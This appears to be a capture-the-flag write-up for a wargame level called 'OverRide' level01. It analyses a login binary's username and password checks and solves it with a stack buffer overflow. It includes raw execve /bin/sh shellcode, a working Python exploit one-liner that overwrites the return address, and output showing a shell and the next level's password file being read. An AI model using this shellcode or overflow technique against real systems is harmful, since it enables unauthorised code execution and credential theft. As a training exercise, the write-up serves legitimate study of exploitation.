i functions : 

```
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
```

- verify_user_name : 
    check if our user_name is 'dat_will'

- verify_user_pass : 
    check if our user_password is 'admin'


But the password does not work. Look at source.c : nothing happens even though you have the right password.

Username is stored on the data segment as a global.

Password is stored on the stack (address : [esp+0x1c]).

---------

**Solution 1 :**

- line 5 : $esp = $ebp - 0x8 => alignment
- line 8 : sub    esp,0x60 (96 decimal)
- $esp = $esp - 0x60 (96o) = $ebp - 104 bytes
- And our buffer password is stored @ $esp + 0x1c = $esp + 28 => buffer password is ebp+76 and eip+80

Goal :
- set a shellcode in the username buffer, after "dat_wil" so that the comparison works.
- Erase next instruction after main ($eip of _libc_start_main) with an overflow of the password buffer.
- Indeed : we need 84 bytes to erase $eip, and fgets() call let the user input (and save in password buffer) up to 100 bytes!

Shellcode : "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"


Use of the shellcode with the adress \x47\xa0\x04\x08  => username adress +  7 (after "dat_wil")

@username + 7 = 0x0804a040 + 7 = 0x0804a047

```
level01@OverRide:~$ (python -c 'print("dat_wil" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")' ; python -c 'print("admin" + "A"*75 + "\x47\xa0\x04\x08")' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
